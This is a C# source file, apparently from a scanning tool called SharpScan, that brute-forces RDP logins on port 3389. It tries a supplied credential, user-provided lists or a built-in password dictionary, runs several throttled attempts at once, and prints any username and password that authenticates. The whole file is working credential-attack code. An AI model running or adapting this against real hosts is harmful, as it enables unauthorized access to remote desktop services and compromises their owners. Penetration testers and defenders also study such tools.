using Microsoft.Win32;
using SharpRDPCheck;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace SharpScan
{
    internal class Rdp
    {
        private static readonly object lockObj = new object(); // Lock object
        private static bool isAuthenticated = false; // Flag to indicate if a valid username/password has been found
        private static int maxConcurrency = 5; // Max number of concurrent attempts
        private static int delayBetweenAttempts = 100; // Delay between attempts in milliseconds

        public static void Run(string IP)
        {
            int Port = 3389;
            if (!Helper.TestPort(IP, Port))
            {
                return;
            }

          //  Console.WriteLine($"[*] {IP}:{Port}{Helper.GetServiceByPort(Port)} is brute force cracking in progress");

            if (!string.IsNullOrEmpty(Program.userName) && !string.IsNullOrEmpty(Program.passWord))
            {
                TryLogin(IP, Port, Program.userName, Program.passWord);
            }
            else if (Program.userList != null && Program.passwordList != null)
            {
                BruteForceLogin(IP, Port, Program.userList, Program.passwordList);
            }
            else if (Configuration.UserDictionary.TryGetValue("rdp", out List<string> rdpUsers))
            {
                BruteForceLogin(IP, Port, rdpUsers, Configuration.Passwords);
            }
            else
            {
                Console.WriteLine("Username list for RDP service not found.");
            }
        }

        private static void TryLogin(string IP, int Port, string user, string pass)
        {
            lock (lockObj)
            {
                if (isAuthenticated) return;
                try
                {
                    Options.Host = IP;
                    Options.Port = Port;
                    Options.Username = user;
                    Options.Password = pass;
                    Network.Connect(Options.Host, Options.Port);
                    MCS.sendConnectionRequest(null, true);
                    isAuthenticated = true;
                    Console.WriteLine($"{user}:{pass} is authenticated");
                }
                catch (Exception)
                {
                    // Handle exceptions
                }
            }
        }

        private static void BruteForceLogin(string IP, int Port, List<string> users, List<string> passwords)
        {
            var tasks = new List<Task>();
            var throttler = new SemaphoreSlim(maxConcurrency);

            foreach (var user in users)
            {
                foreach (var pass in passwords)
                {
                    if (isAuthenticated) return;

                    throttler.Wait();
                    var task = Task.Run(() =>
                    {
                        try
                        {
                            TryLogin(IP, Port, user, pass);
                        }
                        finally
                        {
                            throttler.Release();
                        }
                    });

                    tasks.Add(task);
                    Thread.Sleep(delayBetweenAttempts);
                }
            }

            Task.WaitAll(tasks.ToArray());
        }
    }
}
